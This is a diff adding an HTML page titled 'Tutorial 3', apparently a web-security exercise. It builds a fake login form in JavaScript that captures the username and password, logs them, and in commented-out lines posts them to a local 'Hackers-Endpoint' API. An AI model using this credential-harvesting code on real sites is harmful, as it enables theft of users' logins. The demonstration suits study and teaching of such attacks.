@@ -1,0 +1,88 @@
+<!doctype html>
+<html class="no-js" lang="">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Tutorial 3</title>
+  <link rel="stylesheet" href="css/normalize.css">
+  <link rel="stylesheet" href="css/main.css">
+</head>
+
+<body>
+  <p>Timon Iori</p>
+  
+	<script type="text/javascript">
+		
+		// 1. Creates a HTML Form Object with Javascript
+        var form = document.createElement('form');
+        form.setAttribute('method', 'POST');
+        form.setAttribute('accept-charset', 'utf-8');
+        form.setAttribute('action', '');
+        form.setAttribute('id', 'myform');
+		
+		// 2. Creates an HTML Upsername Input Object with Javascript
+        var input_username = document.createElement('input');
+        input_username.setAttribute('name', 'username');
+        input_username.setAttribute('type', 'text');
+        input_username.setAttribute('id', 'username');
+		
+		// 3. Creates a HTML Password Input Object with Javascript
+		var input_password = document.createElement("input");
+		input_password.setAttribute("name", "password");
+		input_password.setAttribute("type", "password");
+		input_password.setAttribute("id", "password");
+		
+		// 4. Creates a HTML Submit-Button Object with Javascript
+        var input_submit_button = document.createElement('input');
+        input_submit_button.setAttribute('name', 'submit');
+        input_submit_button.setAttribute('value', 'log in');
+        input_submit_button.setAttribute('type', 'submit');
+		
+		// 5. Adds all Elements to the Form
+        form.appendChild(input_username);
+        form.appendChild(document.createElement('br'));
+        form.appendChild(input_password);
+        form.appendChild(document.createElement('br'));
+        form.appendChild(document.createElement('br'));
+        form.appendChild(input_submit_button);
+		
+		// 6. Adds the Form Object with all its children to the HTML Document-Object
+		document.getElementsByTagName('body')[0].appendChild(form);
+		
+		
+		// 7. Creates an Event Listener for the form submit action.
+		// a) either on the Form-Object ("on submit")
+		// b) or on the submit-button input
+		// Info: the event has to be registered on the dynamically added Objects and not on the document itself!	
+		form.addEventListener('submit', function(e) {
+		
+            e.preventDefault();
+            e.stopPropagation();
+			
+			//prevents the submission of other forms to be handled
+			if (e.target && e.target.id === 'myform')
+			{
+				var xmlhttp = new XMLHttpRequest();
+				
+				//Syntax error from Tutorial; It states document.getElementsByID
+				var username = document.getElementById("username").value;
+				var password = document.getElementById("password").value;
+				
+				// 8.1 (debug): logs the results in the console
+				// click F12 in Browser in order to open the Web-Console
+				console.log("username: ", username);
+				console.log("password: ", password);
+				
+				
+				// 8.2 Send the values to the Hackers-Endpoint. In our case our own.Net MVC Application
+				//var xhr = new XMLHttpRequest();
+				//xhr.open('POST', 'http:/localhost:49670/API/CollectUsernamePassword');
+				//xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+				//xhr.send('username=' + username + '&password=' + password);
+			}
+		});
+		
+  </script>
+  
+</body>
+</html>
